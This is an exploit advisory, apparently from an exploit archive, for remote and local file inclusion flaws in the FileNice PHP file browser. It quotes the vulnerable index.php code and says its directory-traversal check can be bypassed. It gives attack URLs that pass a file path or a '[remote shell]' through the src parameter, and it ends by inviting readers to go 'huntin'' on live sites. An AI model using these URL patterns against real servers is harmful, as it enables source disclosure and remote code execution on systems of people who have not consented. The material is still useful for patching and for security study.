@@ -1,0 +1,49 @@
+FileNice file browser RFI&LFI
+
+
+By: e.wiZz!
+
+#######Script site: http://filenice.com
+
+
+
+
+In the wild...
+
+###################################
+
+######Vulnerability:
+
+
+index.php
+
+...
+if(isset($_GET['view'])){
+	if(substr($_GET['view'],0,2) != ".." && substr($_GET['view'],0,1) != "/" && $_GET['view'] != "./" && !stristr($_GET['view'], '../')){
+		$out = new FNOutput;
+		$out->viewFile($_GET['view']);
+	}else{
+		// someone is poking around where they shouldn't be
+		echo("Don't hack my shit yo.");
+		exit;	
+	}
+}else if(isset($_GET['src'])){
+	if(substr($_GET['src'],0,2) != ".." && substr($_GET['src'],0,1) != "/" && $_GET['src'] != "./" && !stristr($_GET['src'], '../')){
+		$out = new FNOutput;
+		$out->showSource($_GET['src']);
+	}else{
+		// someone is poking around where they shouldn't be
+		echo("Don't hack my shit yo.");
+		exit;	
+	}
+
+...
+
+here is some security check for dir-traversal(can be bypassed),but there is no check for RFI,
+also you can see source of any file which is in parent directory:
+
+http://inthewild/path/index.php?src=[lfi]   // index.php or whatever
+http://inthewild/path/index.php?src=[remote shell]
+
+btw. there is lot of other vulnerabilities...happy huntin' :)
+
